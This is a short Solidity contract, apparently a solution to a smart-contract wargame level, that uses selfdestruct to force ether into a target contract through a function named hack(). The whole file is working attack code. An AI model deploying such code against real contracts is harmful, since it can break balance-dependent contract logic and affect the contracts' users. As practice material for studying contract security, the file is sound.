pragma solidity ^0.8.0;

contract HackForce {

    address payable immutable forceContract;

    constructor(address payable _forceContract){
        forceContract = _forceContract;
    }

    function hack() external payable {
        require(msg.value > 0, "Need some eth to hack");
        selfdestruct(forceContract);
    }
}